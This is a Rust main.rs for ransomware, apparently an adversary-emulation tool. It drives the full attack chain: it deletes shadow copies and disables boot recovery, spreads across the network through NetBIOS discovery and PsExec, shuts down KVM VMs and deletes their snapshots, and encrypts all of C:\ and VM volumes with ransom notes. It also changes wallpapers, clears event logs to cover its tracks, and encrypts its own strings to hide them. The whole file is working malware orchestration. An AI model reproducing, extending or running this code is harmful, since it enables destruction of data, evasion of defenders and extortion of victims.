#[macro_use]
extern crate cfg_if;

cfg_if! {
    if #[cfg(target_os = "windows")] {
        mod enumerate;
        mod eventdel;
        mod latmove;
        mod psexec;
        mod recovery;
        mod recycling;
        mod registry;
        mod wallpaper;
        mod winapi_helper;
        mod windowscrate_helper;
        use crate::latmove::propagate::{find_local_targets, propagate_via_psexec, update_maxmpxct_settings};
    } else {
        mod kvm;
        use std::{thread, time::Duration};
    }
}

mod config;
mod discovery;
mod encrypt;
mod logger;
mod proc;
mod service;
use std::fmt::Write as fmt_write;
use std::process::exit;
use clap::{Parser, ArgGroup};
pub use crate::config::Host;
use logger::{config_logger, log_error, log_info};
use simplelog::{SimpleLogger, LevelFilter, Config};
use encryptliterals::{setup_string_literal_encryption, esl};


#[cfg(debug_assertions)]
mod cleanup;

#[cfg(unix)]
const THREAD_POOL_SIZE: usize = 4;

#[cfg(target_os = "windows")]
const THREAD_POOL_SIZE: usize = 12;

#[cfg(target_os = "windows")]
const GLOBAL_THREAD_POOL_SIZE: usize = 30;

/// Definitions for all command line arguments
#[derive(Parser, Debug)]
#[command(group = ArgGroup::new("decrypt_args").multiple(true).requires_all(["clean_up", "key"]))]

struct Args {
    #[arg(long)]
    access_token: Option<String>,

    #[arg(long)]
    prop: bool, // Override config to enable propagation via psexec 

    #[arg(long)]
    no_prop: bool, // Override config to disable network scanning and propagation via psexec

    /// Enable cleanup mode
    #[cfg(debug_assertions)]
    #[clap(group = "decrypt_args", long)]
    clean_up: bool, 

    /// AES key for decrypting
    #[cfg(debug_assertions)]
    #[clap(group = "decrypt_args", long)]
    key: Option<String>, 
}

setup_string_literal_encryption!();

fn main() {
    // INITIAL SETUP

    // Parse command line arguments
    let args = Args::parse();

    // Verify access token to obtain configuration
    let access_token = match args.access_token.clone() {
        Some(a) => a,
        None => {
            #[cfg(debug_assertions)] {
                eprintln!("{}", esl!("Failed to get access token argument."));
                exit(1);
            }

            #[cfg(not(debug_assertions))]
            exit(1);
        }
    };
    let config = match config::validate_access_token(&access_token) {
        Ok(c) => c,
        #[cfg(debug_assertions)]
        Err(e) => {
            eprintln!("{}: {}", esl!("Failed to validate access token"), e);
            exit(1);
        }

        #[cfg(not(debug_assertions))]
        Err(_) => {
            exit(1);
        }
    };
    
    // Log events to a file and stderr
    let logger = config_logger();
    match logger {
        Ok(_) => logger::log_info(String::from(esl!("Logger setup successful"))),
        Err(e) => {
            let _ = SimpleLogger::init(LevelFilter::Info, Config::default());
            log_error(format!("{}: {}", esl!("Logger setup failed"), e))
        }
    }

    // Instantiate a new Host object with the config
    let mut h = Host::new(config);
    log_info(String::from(esl!("Loaded configuration information.")));

    log_info(format!("{} {}", esl!("Current configuration: "), h));

    // Determine if program is being run as admin
    let elevated = discovery::is_elevated();
    if elevated {
        log_info(String::from(esl!("Running ELEVATED")));
    } else {
        log_info(String::from(esl!("Running UNELEVATED")));
    }

    // Set up threadpools
    let pool = match rayon::ThreadPoolBuilder::new().num_threads(THREAD_POOL_SIZE).build() {
        Ok(p) => p,
        Err(e) => {
            log_error(format!("{}: {}", esl!("Failed to create thread pool: "), e));
            exit(2);
        }
    };
    log_info(format!("{} {}", esl!("Created encryption thread pool of size"), pool.current_num_threads()));

    #[cfg(target_os = "windows")] {
        match rayon::ThreadPoolBuilder::new()
            .num_threads(GLOBAL_THREAD_POOL_SIZE)
            .build_global() {
            Ok(_) => {},
            Err(e) => {
                log_error(format!("{}: {}", esl!("Failed to configure global thread pool for network discovery: "), e));
                exit(3);
            }
        }
    }

    // If we're in cleanup mode, just decrypt and exit
    #[cfg(debug_assertions)] {
        if args.clean_up {
            let key_string = match args.key {
                Some(k) => k,
                None => {
                    log_error(String::from(esl!("Failed to get key argument.")));
                    exit(1);
                }
            };
            if key_string.len() == 32 {
                let mut key = [0;16];
                match hex::decode_to_slice(key_string, &mut key) {
                    Ok(_) => {},
                    Err(e) => {
                        log_error(format!("{}: {}", esl!("Failed to decode key argument"), e));
                        exit(4);
                    }
                }
                h.set_aes_key(key);
                log_info(String::from(esl!("Beginning encryption cleanup.")));

                #[cfg(target_os = "windows")]
                match cleanup::enumerate_and_decrypt(&pool, &h, esl!("C:\\").to_string()) {
                    Ok(v) => {
                        log_info(String::from(esl!("Finished encryption cleanup.")));
                        logger::log_debug(String::from(esl!("Decrypted files: ")));
                        for file in v {
                            logger::log_debug(file);
                        }
                        std::process::exit(0);
                    },
                    Err(e) => {
                        log_error(format!("{}: {}", esl!("Failed to enumerate and decrypt files"), e));
                        std::process::exit(6);
                    }
                }

                #[cfg(unix)] {
                    cleanup::enumerate_and_decrypt_volumes(&pool, h.get_aes_key(), h.get_extension(), h.get_note_file_name());
                    log_info(String::from(esl!("Finished encryption cleanup.")));
                    std::process::exit(0);
                }
            } else {
                log_error(String::from(esl!("Invalid AES key format. AES key must be 32 bytes")));
                std::process::exit(2);
            }
        }
    }

    // RECOVERY HAMPERING (windows only)
    #[cfg(target_os = "windows")]
    if h.is_recovery_hampering_enabled() {
        // Delete any available shadow copies
        log_info(String::from(esl!("Deleting shadow copies.")));
        match recovery::delete_shadow_copies() {
            Ok(_) => log_info(String::from(esl!("Successfully deleted shadow copies."))),
            Err(e) => log_error(format!("{}: {}", esl!("Failed to delete shadow copies"), e))
        }

        // Disable bootloader
        log_info(String::from(esl!("Disabling bootloader recovery.")));
        match recovery::disable_bootloader_recovery() {
            Ok(_) => log_info(String::from(esl!("Successfully disabled bootloader recovery"))),
            Err(e) => log_error(format!("{}: {}", esl!("Disabling bootloader recovery failed"), e))
        }
    } else {
        log_info(String::from(esl!("Skipping recovery hampering (disable bootloader, delete shadow copies).")));
    }

    // DISCOVERY

    // Collect system information, such as UUID
    log_info(String::from(esl!("Determining system UUID.")));
    let uuid = discovery::get_uuid(elevated);
    log_info(format!("{}: {}", esl!("System ID"), uuid));

    // Get current username
    match discovery::get_username() {
        Ok(u) => {
            log_info(format!("{}: {}", esl!("Currently running as user"), u));
        },
        Err(e) => {
            log_error(format!("{}: {}", esl!("Failed to get current username"), e))
        }
    }

    // Get hostname
    match discovery::get_hostname() {
        Ok(hostname) => {
            log_info(format!("{}: {}", esl!("Currently running on host"), hostname));
        },
        Err(e) => {
            log_error(format!("{}: {}", esl!("Failed to get hostname"), e))
        }
    }

    // SYMBOLIC LINKS (windows only)

    // Enable remote-to-local and remote-to-remote symbolic link evaluation via fsutil
    #[cfg(target_os = "windows")] {
        if !elevated {
            log_error(String::from(esl!("Program does not have permission to enable remote-to-local and remote-to-remote symbolic link evaluation.")));
        } else {
            log_info(String::from(esl!("Enabling remote-to-local and remote-to-remote symbolic link evaluation.")));
            match enumerate::enable_symbolic_links() {
                Ok(_) => log_info(String::from(esl!("Successfully enabled remote-to-local and remote-to-remote symbolic link evaluation"))),
                Err(e) => log_error(format!("{}: {}", esl!("Failed to enable remote-to-local and remote-to-remote symbolic link evaluation"), e))
            }
        }
    }

    // RECYCLE BIN (windows only)
    #[cfg(target_os = "windows")]
    if h.is_empty_recycling_bin() {
        log_info(String::from(esl!("Emptying recycle bin")));
        recycling::empty_recycling_bin();
    } else {
        log_info(String::from(esl!("Skipping recycle bin.")));
    }

    // PROPAGATION (windows only)

    // Find other hosts to propagate to
    #[cfg(target_os = "windows")]
    if h.is_network_discovery_enabled() && !args.no_prop {
        // Update MaxMpxCt registry key value
        #[cfg(target_os = "windows")]
        if !elevated {
            log_error(String::from(esl!("Program does not have required privileges to make the registry changes for MaxMpxCt")));
        } else {
            log_info(String::from(esl!("Setting MaxMpxCt value in registry.")));
            match update_maxmpxct_settings() {
                Ok(_) => log_info(String::from(esl!("MaxMpxCt update successful"))),
                Err(e) => log_error(format!("{}: {}", esl!("MaxMpxCt update failed"), e))
            }
        }

        // NetBios discovery
        log_info(String::from(esl!("Performing NetBIOS network discovery to find remote hosts.")));
        let local_targets = match find_local_targets(h.get_strict_include_targets(), h.get_strict_include_scan_ranges()) {
            Ok(s) => {
                log_info(format!("{}: {:?}", esl!("Found local targets"), s));
                s
            }
            Err(e) => {
                log_error(format!("{}: {}", esl!("Finding local targets failed"), e));
                Vec::new()
            }
        };

        // Propagate to discovered hosts via PsExec
        if args.prop || (h.is_propagation_enabled() && !args.no_prop) {
            log_info(String::from(esl!("Performing PsExec propagation.")));
            match propagate_via_psexec(local_targets, h.get_psexec_username(), h.get_psexec_password(), &access_token) {
                Ok(_) => log_info(String::from(esl!("Propagation complete"))),
                Err(e) => {
                    log_error(format!("{}: {}", esl!("Propagation failed"), e));
                }
            }
        } else {
            log_info(String::from(esl!("Skipping propagation via PsExec.")));
        }
    } else {
        log_info(String::from(esl!("Skipping network discovery.")));
    }

    // MOUNT HIDDEN PARTITIONS (windows only)
    #[cfg(target_os = "windows")]
    let mount_points: Vec::<String>;
    #[cfg(target_os = "windows")] {
        if h.is_mount_hidden_partitions_enabled() {
            log_info(String::from(esl!("Searching for and mounting hidden partitions.")));
            mount_points = match enumerate::mount_hidden_partitions() {
                Ok(s) => {
                    log_info(String::from(esl!("Finished mounting hidden partitions")));
                    s
                }
                Err(e) => {
                    log_error(format!("{}: {}", esl!("Mounting hidden partitions failed"), e));
                    Vec::<String>::new()
                }
            };

            // Debug - enumerate hidden partition files
            #[cfg(debug_assertions)]
            for mount_point in &mount_points {
                logger::log_debug(String::from(esl!("Enumerating files in mounted hidden partitions.")));
                match enumerate::enumerate_dir_files(std::path::Path::new(&mount_point)) {
                    Ok(_) => {
                        log_info(format!("{} {}", esl!("Finished enumerating files in mount point"), mount_point));
                    },
                    Err(e) => {
                        log_error(format!("{} {}: {}", esl!("Failed to enumerate files in mount point"), mount_point, e));
                    }
                }
            }
        } else {
            log_info(String::from(esl!("Skipping hidden partitions.")));
            mount_points = Vec::<String>::new();
        }
    }

    // Verify target Linux server has KVM tools installed (virsh). Linux-only
    #[cfg(unix)]
    let kvm_available: bool = match kvm::check_kvm_version_info() {
        Ok(_) => {
            log_info(String::from(esl!("Confirmed KVM installed on target machine.")));
            true
        },
        Err(e) => {
            log_error(format!("{}: {}", esl!("Failed to check KVM version"), e));
            false
        }
    };

    #[cfg(unix)]
    let mut kvm_volume_paths: Vec<String> = Vec::new();

    // Process KVM server VMs and snapshots. Linux-only
    #[cfg(unix)]
    if kvm_available {
        // Enumerate VMs
        log_info(String::from(esl!("Enumerating VMs.")));
        let kvm_vms = match kvm::get_vms() {
            Ok(o) => {
                log_info(format!("{}:\n{}", esl!("Discovered the following KVM VMs"), o.join("\n")));
                o
            },
            Err(e) => {
                log_error(format!("{}: {}", esl!("Failed to get KVM VMs"), e));
                Vec::new()
            }
        };

        if kvm_vms.len() > 0 {
            // Stop VMs
            let mut vms_shutting_down = false;
            if h.is_vm_kill_enabled() {
                log_info(String::from(esl!("Shutting down VMs.")));
                for vm in &kvm_vms {
                    match kvm::shutdown_vm(vm.clone()) {
                        Ok(_) => {
                            vms_shutting_down = true;
                            log_info(format!("{} {}", esl!("Successfully began shutting down VM"), vm));
                        },
                        Err(e) => {
                            log_error(format!("{} {}: {}", esl!("Failed to shut down VM"), vm, e));
                        }
                    }
                }
            } else {
                log_info(String::from(esl!("Skipping VM shutdown.")));
            }
            
            // Enumerate and delete VM snapshots (if deletion is enabled)
            log_info(String::from(esl!("Enumerating and deleting VM snapshots.")));
            for vm in &kvm_vms {
                let kvm_snapshots = match kvm::get_vm_snapshots(vm.clone()) {
                    Ok(o) => {
                        log_info(format!("{} {}:\n{}", esl!("Discovered the following snapshots for"), vm, o.join("\n")));
                        o
                    },
                    Err(e) => {
                        log_error(format!("{} {}: {}", esl!("Failed to get snapshots for"), vm, e));
                        Vec::new()
                    } 
                };

                // Delete each snapshot
                if h.is_vm_snapshot_kill_enabled() {
                    for snapshot in kvm_snapshots {
                        match kvm::delete_snapshot(vm.clone(), snapshot.clone()) {
                            Ok(_) => {
                                log_info(format!("{} {} for VM {}", esl!("Successfully deleted snapshot"), snapshot, vm));
                            },
                            Err(e) => {
                                log_error(format!("{} {} for VM {}: {}", esl!("Failed to delete snapshot"), snapshot, vm, e));
                            }
                        }
                    }
                } else {
                    log_info(String::from(esl!("Skipping VM snapshot deletion.")));
                }
            }

            // Enumerate volume paths from default pool
            log_info(String::from(esl!("Enumerating volume paths from default pool.")));
            kvm_volume_paths = match kvm::get_volume_paths() {
                Ok(o) => {
                    log_info(format!("{}:\n{}", esl!("Discovered the following default pool volume paths"), o.join("\n")));
                    o
                },
                Err(e) => {
                    log_error(format!("{}: {}", esl!("Failed to get volume paths for default pool"), e));
                    Vec::new()
                }
            };

            // Wait 30 seconds for VMs to finish shutting down
            if h.is_vm_kill_enabled() && vms_shutting_down {
                log_info(String::from(esl!("Waiting for VMs to finish shutting down.")));
                thread::sleep(Duration::from_secs(30));
            }
        } else {
            log_info(String::from(esl!("No VMs found. Skipping rest of VM-related ransomware activity.")));
        }
    } else {
        log_info(String::from(esl!("Not a KVM server. Skipping VM enumeration.")));
    }

    // ENCRYPTION
    if h.is_encryption_enabled() {
        // Set AES encryption key
        log_info(String::from(esl!("Generating AES key.")));
        encrypt::set_aes_key(&mut h);
        let mut key = String::new();
        for &byte in h.get_aes_key() {
            match write!(&mut key, "{:02x}", byte) {
                Ok(_) => {},
                Err(e) => {
                    log_error(format!("{}: {}", esl!("Failed to write key hex value"), e));
                }
            }
        }
        log_info(format!("{}: {}", esl!("AES key set to"), key));

        // Kill processes and terminate services to prepare for encryption
        log_info(String::from(esl!("Terminating processes and services that may interfere with encryption.")));
        if !elevated {
            log_error(String::from(esl!("Program does not have permission to terminate processes and services")));
        } else {
            h.kill_services_for_encryption();
            h.kill_processes_for_encryption();
        }

        // Windows-only: Enumerate and encrypt files on the victim computer, and save the ransom note as well
        #[cfg(target_os = "windows")] {
            log_info(String::from(esl!("Beginning enumeration and encryption.")));
            match enumerate::enumerate_and_encrypt(&pool, &h, "C:\\".to_string()) {
                Ok(processed_files) => {
                    log_info(format!("{} {} {}", esl!("Finished enumeration and encryption. Total of"), processed_files.len(), esl!("files found and processed.")));
                }
                Err(e) => {
                    log_error(format!("{}: {}", esl!("Failed to enumerate and encrypt files"), e));
                }
            };
        }

        // Linux-only: encrypt the VM volumes
        #[cfg(unix)] {
            if kvm_volume_paths.len() > 0 {
                log_info(String::from(esl!("Encrypting VM volumes.")));
                kvm::encrypt_volumes(&pool, &kvm_volume_paths, h.get_aes_key(), h.get_extension(), h.get_note_file_name(), h.get_note_full_text());
                log_info(String::from(esl!("Finished encrypting VM volumes.")));
            } else {
                log_info(String::from(esl!("No VM volumes to encrypt. Skipping.")));
            }
        }
    } else {
        log_info(String::from(esl!("Encryption not enabled. Skipping encryption-related functionality.")));
    }

    // Change wallpaper for logged-in users (windows only)
    #[cfg(target_os = "windows")]
    if h.is_set_enable_wallpaper() {
        if !elevated {
            log_error(String::from(esl!("Program does not have permission to set wallpaper for users.")));
        } else {
            log_info(String::from(esl!("Performing wallpaper changes for logged-in users.")));
            match wallpaper::set_wallpaper(&h.get_extension()) {
                Ok(_) => log_info(String::from(esl!("Completed wallpaper changes."))),
                Err(e) => log_error(format!("{}: {}", esl!("Wallpaper failed"), e))
            }
        }
    } else {
        log_info(String::from(esl!("Skipping wallpaper changes.")));
    }

    // Unmount any mounted hidden partitions (windows only)
    #[cfg(target_os = "windows")]
    if h.is_mount_hidden_partitions_enabled() && h.is_unmount_hidden_partitions_enabled() {
        log_info(String::from(esl!("Unmounting previously mounted hidden partitions.")));
        for mount_point in mount_points {
            enumerate::unmount_and_del_mount_point(mount_point.clone()).unwrap_or_else(|error| {
                log_error(format!("{} {}: {}", esl!("Failed to unmount and delete"), mount_point, error))
            })
        }
        log_info(String::from(esl!("Finished unmounting hidden partitions.")));
    } else {
        log_info(String::from(esl!("Skipping unmounting hidden partitions.")));
    }

    // Delete shadow copies again (windows only)
    #[cfg(target_os = "windows")]
    if h.is_recovery_hampering_enabled() {
        log_info(String::from(esl!("Deleting shadow copies again.")));
        match recovery::delete_shadow_copies() {
            Ok(_) => log_info(String::from(esl!("Successfully deleted shadow copies (second time)."))),
            Err(e) => log_error(format!("{}: {}", esl!("Failed to delete shadow copies"), e))
        }
    } else {
        log_info(String::from(esl!("Skipping final shadow copy delete.")));
    }

    // Clear event logs (windows only)
    #[cfg(target_os = "windows")]
    if h.is_event_del_enabled() {
        if !elevated {
            log_error(String::from(esl!("Program does not have permission to clear event logs")));
        } else {
            log_info(String::from(esl!("Clearing event logs.")));
            match eventdel::clear_event_logs() {
                Err(e) => log_error(format!("{}: {}", esl!("clear_event_logs failed"), e)),
                Ok(_) => log_info(String::from(esl!("clear_event_logs executed successfully")))
            }
        }
    } else {
        log_info(String::from(esl!("Skipping event log deletion.")));
    }
}